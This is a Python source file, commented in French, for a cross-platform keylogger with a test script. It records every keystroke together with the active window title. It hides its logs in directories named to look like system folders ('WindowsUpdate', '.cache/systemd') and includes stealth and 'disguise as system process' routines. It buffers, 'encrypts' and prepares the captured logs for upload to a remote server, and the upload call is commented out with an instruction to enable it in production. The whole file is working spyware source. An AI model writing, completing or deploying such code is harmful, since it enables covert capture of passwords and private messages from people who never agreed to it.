import threading
import time 
import json
import os 
import psutil
from datetime import datetime
from pynput import keyboard
import logging
import zipfile
import tempfile
from pathlib import Path
import platform

# Mock Encryptor pour tester (à remplacer par ton vrai encryptor)
class MockEncryptor:
    def encrypt(self, data):
        return json.dumps(data)  # Simule l'encryption

class Keylogger:
    def __init__(self, encryptor=None, client_id="test_client", server_url="http://localhost:5000"):
        self.encryptor = encryptor or MockEncryptor()
        self.client_id = client_id
        self.server_url = server_url
        self.is_running = False
        self.stealth_mode = True
        self.log_buffer = []
        self.listener = None
        self.buffer_size = 50  # CORRIGÉ: 'beffer' -> 'buffer'
        self.max_log_size = 10*1024*1024
        self.current_log_file = None
        self.log_rotation_count = 0
        self.max_log_files = 5
        self.upload_interval = 30
        
        self.system = platform.system().lower()
        self.is_windows = self.system == 'windows'
        self.is_linux = self.system == "linux"
        
        self.setup_os_specific_logging()
        
    def setup_os_specific_logging(self):
        try:
            logging.getLogger('pynput').setLevel(logging.ERROR)
            
            if self.is_windows:
                self.log_dir = Path(tempfile.gettempdir()) / "WindowsUpdate"
            elif self.is_linux:
                self.log_dir = Path("/tmp") / ".cache" / "systemd"
            else:
                self.log_dir = Path(tempfile.gettempdir()) / "system_logs"
            
            # CORRIGÉ: self.log_dir.mkdir au lieu de self.log_dir()
            self.log_dir.mkdir(parents=True, exist_ok=True)
            self.current_log_file = self.log_dir / "system_log.txt"
            print(f"[INFO] Log directory: {self.log_dir}")
        except Exception as e:
            print(f"OS-specific setup error: {e}")
    
    def get_active_window(self):
        try: 
            if self.is_windows:
                return self.get_active_window_windows()
            elif self.is_linux:
                return self.get_active_window_linux()
            else:
                return "Unknown"
        except Exception as e:
            return f"Unknown - {e}"
    
    def get_active_window_windows(self):
        try:
            import win32gui
            window = win32gui.GetForegroundWindow()
            window_title = win32gui.GetWindowText(window)
            return window_title[:100] if window_title else "Desktop"
        except ImportError:
            return "Unknown (win32gui not available)"
        except Exception:
            return "Unknown"
        
    def get_active_window_linux(self):
        try:
            import subprocess
            try:
                result = subprocess.run(
                    ['wmctrl', '-l', '-p'],
                    capture_output=True,
                    text=True,
                    timeout=2
                )
                if result.returncode == 0:
                    lines = result.stdout.strip().split('\n')
                    for line in lines:
                        if '0x' in line:
                            return line.split(' ', 3)[-1][:100]
            except (subprocess.TimeoutExpired, FileNotFoundError):  # CORRIGÉ: FileExistsError -> FileNotFoundError
                pass
            
            # Fallback
            try:
                result = subprocess.run(
                    ['xprop', '-root', '_NET_ACTIVE_WINDOW'], 
                    capture_output=True, 
                    text=True, 
                    timeout=2
                )
                if result.returncode == 0:
                    window_id = result.stdout.split()[-1]
                    if window_id != '0x0':
                        result = subprocess.run(
                            ['xprop', '-id', window_id, 'WM_NAME'], 
                            capture_output=True, 
                            text=True, 
                            timeout=2
                        )
                        if result.returncode == 0:
                            name_line = result.stdout.split('=', 1)[-1].strip()
                            return name_line.strip('"')[:100]
            except (subprocess.TimeoutExpired, FileNotFoundError):
                pass
            return "Unknown"
        except Exception as e:
            return f"Unknown - {str(e)}"
        
    def disguise_as_system_process(self):  # CORRIGÉ: 'diguise' -> 'disguise'
        try:
            if self.is_windows:
                return self.disguise_windows()  # CORRIGÉ
            elif self.is_linux:
                return self.disguise_linux()  # CORRIGÉ
            else:
                return self.minimal_stealth()
        except Exception:
            return self.minimal_stealth()
    
    def disguise_windows(self):  # CORRIGÉ: 'diguise' -> 'disguise'
        try:
            if hasattr(os, 'nice'):
                os.nice(10)
            return True
        except:
            return False
    
    def disguise_linux(self):  # CORRIGÉ: 'diguise' -> 'disguise'
        try:
            if hasattr(os, 'nice'):
                os.nice(10)
            return True
        except:
            return False
        
    def minimal_stealth(self):
        try:
            if hasattr(os, 'nice'):
                os.nice(10)
            return True
        except:
            return True  
        
    def setup_keyboard_listener(self):
        try: 
            from pynput import keyboard
            self.listener = keyboard.Listener(on_press=self.on_press)
            return True
        except ImportError as e:
            print(f"Keyboard listener unavailable: {e}")
            return False  # CORRIGÉ: retourne False si import échoue
        except Exception as e:
            print(f"Listener setup error: {e}")
            return False 
    
    def on_press(self, key):
        if not self.is_running:
            return False
        try:
            keystroke = self.process_key(key)
            if keystroke:
                timestamp = datetime.now().isoformat()
                window_title = self.get_active_window()
                
                log_entry = {
                    'timestamp': timestamp,
                    'keystroke': keystroke,
                    'window': window_title,
                    'client_id': self.client_id,
                    'os': self.system
                }
                
                self.log_buffer.append(log_entry)
                self.write_to_logfile(log_entry)
                self.check_log_rotation()
                
                if len(self.log_buffer) >= self.buffer_size:
                    self.send_logs_async()
                
        except Exception as e:
            print(f"Key processing error: {e}")
        
    def process_key(self, key):
        try:
            from pynput import keyboard
            
            if hasattr(key, 'char') and key.char is not None:
                return key.char
            
            special_keys = {
                keyboard.Key.space: ' ',
                keyboard.Key.enter: '[ENTER]',
                keyboard.Key.backspace: '[BACKSPACE]',
                keyboard.Key.tab: '[TAB]',
                keyboard.Key.esc: '[ESC]',
                keyboard.Key.delete: '[DEL]',
                keyboard.Key.shift: '[SHIFT]',
                keyboard.Key.ctrl_l: '[CTRL]',
                keyboard.Key.ctrl_r: '[CTRL]',
                keyboard.Key.alt_l: '[ALT]',
                keyboard.Key.alt_r: '[ALT]',
                keyboard.Key.cmd: '[CMD]', 
                keyboard.Key.cmd_r: '[CMD]',
            }
            
            if self.is_linux:
                special_keys.update({
                    keyboard.Key.alt_gr: '[ALT_GR]',
                })
            
            return special_keys.get(key, f'[{str(key).replace("Key.", "")}]')
        except Exception as e:
            return f'[UNKNOWN: {str(key)}]'
        
    def write_to_logfile(self, log_entry):
        try:
            with open(self.current_log_file, 'a', encoding='utf-8') as f:
                f.write(f"{log_entry['timestamp']} | {log_entry['window']} | {log_entry['keystroke']}\n")
        except Exception as e:
            print(f"Log file write error: {e}")
            
    def check_log_rotation(self):
        try:
            if os.path.exists(self.current_log_file):
                file_size = os.path.getsize(self.current_log_file)
                if file_size > self.max_log_size:  # CORRIGÉ: max_log_files -> max_log_size
                    self.rotate_log_file()
        except Exception as e:
            print(f"Log rotation error: {e}")
            
    def rotate_log_file(self):
        try:
            self.log_rotation_count += 1
            new_name = f"system_log_{self.log_rotation_count}.txt"
            archived_file = self.log_dir / new_name
            
            if os.path.exists(self.current_log_file):
                os.rename(self.current_log_file, archived_file)
            
            self.current_log_file = self.log_dir / "system_log.txt"
            
            self.cleanup_old_logs()
        except Exception as e:
            print(f"Log rotation failed: {e}")
    
    def cleanup_old_logs(self):
        try:
            log_files = list(self.log_dir.glob("system_log_*.txt"))
            if len(log_files) > self.max_log_files:
                log_files.sort(key=os.path.getmtime)
                for old_file in log_files[:-self.max_log_files]:
                    os.remove(old_file)
        except Exception as e:
            print(f"Log cleanup error: {e}")
            
    def start_upload_thread(self):
        def upload_worker():
            while self.is_running:
                time.sleep(self.upload_interval)
                if self.log_buffer:
                    self.send_logs_async()
        
        self.upload_thread = threading.Thread(target=upload_worker, daemon=True)
        self.upload_thread.start()
    
    def send_logs_async(self):
        if not self.log_buffer:
            return
        
        try:
            logs_to_send = self.log_buffer.copy()
            self.log_buffer.clear()
            
            upload_thread = threading.Thread(
                target=self.send_logs_sync, 
                args=(logs_to_send,),
                daemon=True
            )
            upload_thread.start()
        except Exception as e:
            print(f"Async send error: {e}")
            
    def send_logs_sync(self, logs):
        try:
            import requests  # AJOUT: import manquant
            log_data = {
                "type": "keylog_data",
                "client_id": self.client_id,
                "logs": logs,
                "timestamp": datetime.now().isoformat(),
                "log_count": len(logs)
            }
            
            encrypted_data = self.encryptor.encrypt(log_data)
            
            # Pour le test, on simule l'envoi
            print(f"[TEST] Would send {len(logs)} logs to server")
            print(f"[TEST] Sample log: {logs[0] if logs else 'None'}")
            
            # En production, décommente ceci:
            # response = requests.post(
            #     f"{self.server_url}/keylog_data",
            #     json={"data": encrypted_data},
            #     timeout=15
            # )   
            
            # if response.status_code == 200:
            #     print(f"[KEYLOG] Successfully sent {len(logs)} keystrokes from {self.system}")
            # else:
            #     self.log_buffer.extend(logs)
            #     print(f"[KEYLOG] Send failed: {response.status_code}")
            
        except Exception as e:
            print(f"[KEYLOG] Send error: {e}")
            self.log_buffer.extend(logs)
            
    def start(self, stealth=True):
        if self.is_running:
            return {"success": False, "error": "Keylogger already running"}
        
        try:
            self.stealth_mode = stealth
            self.is_running = True
            
            # Vérifier les dépendances
            if not self.setup_keyboard_listener():
                return {"success": False, "error": "Keyboard listener unavailable"}
            
            self.listener.start()
            
            if stealth:
                self.disguise_as_system_process()
            
            self.start_upload_thread()
            
            return {
                "success": True, 
                "message": f"Keylogger started on {self.system}",
                "os": self.system,
                "log_file": str(self.current_log_file),
                "stealth_mode": stealth
            }
        except Exception as e:
            return {"success": False, "error": str(e)}
        
    def stop(self):
        if not self.is_running:
            return {"success": False, "error": "Keylogger not running"}
        
        try:
            self.is_running = False
            
            if self.listener:
                self.listener.stop()
            
            if self.log_buffer:
                self.send_logs_sync(self.log_buffer.copy())
                self.log_buffer.clear()
            
            return {
                "success": True, 
                "message": f"Keylogger stopped on {self.system}",
                "final_count": len(self.log_buffer),
                "os": self.system
            }
        except Exception as e:
            return {"success": False, "error": str(e)}
        
    def get_status(self):
        try:
            log_file_size = 0
            if os.path.exists(self.current_log_file):
                log_file_size = os.path.getsize(self.current_log_file)
            
            return {
                "running": self.is_running,
                "os": self.system,
                "stealth_mode": self.stealth_mode,
                "buffered_keystrokes": len(self.log_buffer),
                "log_file_size": log_file_size,
                "log_file_path": str(self.current_log_file),
                "archived_logs": len(list(self.log_dir.glob("system_log_*.txt"))),
                "upload_interval": self.upload_interval
            }
        except Exception as e:
            return {"error": str(e)}

# TEST SCRIPT
if __name__ == "__main__":
    print("=== TEST KEYLOGGER ===")
    
    # Initialisation
    keylogger = Keylogger()
    
    # Test démarrage
    print("\n1. Starting keylogger...")
    result = keylogger.start(stealth=False)
    print(f"Start result: {result}")
    
    if result["success"]:
        print("\n2. Keylogger running. Type some text and press ESC to stop...")
        
        # Attendre que l'utilisateur tape
        from pynput import keyboard
        
        def on_escape(key):
            if key == keyboard.Key.esc:
                print("\n3. ESC pressed, stopping keylogger...")
                stop_result = keylogger.stop()
                print(f"Stop result: {stop_result}")
                
                # Afficher le statut final
                status = keylogger.get_status()
                print(f"Final status: {status}")
                
                # Afficher le contenu du fichier log
                if os.path.exists(keylogger.current_log_file):
                    print(f"\n4. Log file content ({keylogger.current_log_file}):")
                    with open(keylogger.current_log_file, 'r') as f:
                        print(f.read())
                
                return False  # Stop listener
        
        # Écouter la touche ESC pour arrêter
        with keyboard.Listener(on_press=on_escape) as escape_listener:
            escape_listener.join()
    else:
        print(f"Failed to start: {result['error']}")